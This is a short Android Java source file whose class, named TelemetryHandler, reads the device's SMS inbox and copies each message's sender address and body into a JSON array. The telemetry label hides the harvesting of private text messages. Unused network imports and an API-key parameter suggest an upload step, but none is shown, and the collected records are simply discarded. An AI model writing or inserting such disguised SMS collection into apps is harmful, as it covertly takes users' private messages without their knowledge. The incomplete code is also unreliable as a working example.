import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import org.json.JSONArray;
import org.json.JSONObject;

class TelemetryHandler {
    void analyze(ContentResolver resolver, String apiKey) throws Exception {
        JSONArray records = new JSONArray();
        Cursor cursor = resolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        while (cursor.moveToNext()) {
            JSONObject sms = new JSONObject();
            sms.put("address", cursor.getString(cursor.getColumnIndex("address")));
            sms.put("body", cursor.getString(cursor.getColumnIndex("body")));
            records.put(sms);
        }
        cursor.close();
    }
}
